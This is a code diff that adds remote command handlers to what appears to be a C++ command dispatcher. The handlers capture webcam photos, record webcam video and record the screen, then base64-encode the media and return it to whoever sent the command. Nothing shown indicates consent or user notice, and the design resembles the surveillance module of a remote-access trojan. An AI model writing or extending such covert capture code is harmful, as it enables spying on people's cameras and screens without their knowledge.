@@ -234,6 +234,45 @@ void CommandDispatcher::registerHandlers() {
         }
     };
 
+    routes_[Protocol::TYPE::CAMSHOT] = [](const Message& msg, ResponseCallBack cb) {
+        try {
+            CameraCapture cc;
+            std::string b64Image = cc.captureAndEncode();
+            if (b64Image.empty()) {
+                cb(Message(
+                    Protocol::TYPE::CAMSHOT, 
+                    {
+                        {"status", "failed"},
+                        {"msg", "Captured data is empty"}
+                    },
+                    "",
+                    msg.from));
+            } else {
+                cb(Message(
+                    Protocol::TYPE::CAMSHOT, 
+                    {
+                        {"status", "ok"},
+                        {"mime", "image/jpeg"},
+                        {"data", b64Image},
+                        {"msg", "Camera captured"}
+                    }, 
+                    "", 
+                    msg.from
+                ));
+            }
+        } catch (const std::exception& e) {
+            cb(Message(
+                Protocol::TYPE::CAMSHOT, 
+                {
+                    {"status", "failed"},
+                    {"msg", std::string("Camera shot error: ") + e.what()}
+                }, 
+                "", 
+                msg.from
+            ));
+        }
+    };
+
 
     routes_[Protocol::TYPE::CAM_RECORD] = [](const Message& msg, ResponseCallBack cb) {
         std::thread([msg, cb]() {
@@ -270,6 +309,65 @@ void CommandDispatcher::registerHandlers() {
                 } else {
                     cb(Message(
                         Protocol::TYPE::CAM_RECORD, 
+                        {
+                            {"status", "ok"},
+                            {"mime", "video/mp4"},
+                            {"duration", duration},
+                            {"data", b64Video},
+                            {"msg", "Video recorded"}
+                        }, 
+                        "", 
+                        msg.from
+                    ));
+                }
+            } catch (const std::exception& e) {
+                cb(Message(
+                    Protocol::TYPE::ERROR, 
+                    {
+                        {"msg", std::string("Async Camera Error: ") + e.what()}
+                    }, 
+                    "", 
+                    msg.from
+                ));
+            }
+        }).detach();
+    };
+
+    routes_[Protocol::TYPE::SCR_RECORD] = [](const Message& msg, ResponseCallBack cb) {
+        std::thread([msg, cb]() {
+            try {
+                int duration = 10;
+                
+                if (msg.data.is_object() && msg.data.contains("duration")) {
+                    duration = msg.data["duration"].get<int>();
+                } else if (msg.data.is_number()) {
+                    duration = msg.data.get<int>();
+                } else if (msg.data.is_string()) {
+                    try { 
+                        duration = std::stoi(msg.data.get<std::string>()); 
+                    } 
+                    catch(...) {}
+                }
+
+                if (duration < 1) duration = 1;
+                if (duration > 15) duration = 15;
+
+                ScreenRecorder cam;
+                std::string b64Video = cam.recordBase64(duration);
+
+                if (b64Video.empty()) {
+                    cb(Message(
+                        Protocol::TYPE::SCR_RECORD, 
+                        {
+                            {"status", "failed"},
+                            {"msg", "Camera busy or not found"}
+                        }, 
+                        "", 
+                        msg.from
+                    ));
+                } else {
+                    cb(Message(
+                        Protocol::TYPE::SCR_RECORD, 
                         {
                             {"status", "ok"},
                             {"mime", "video/mp4"},
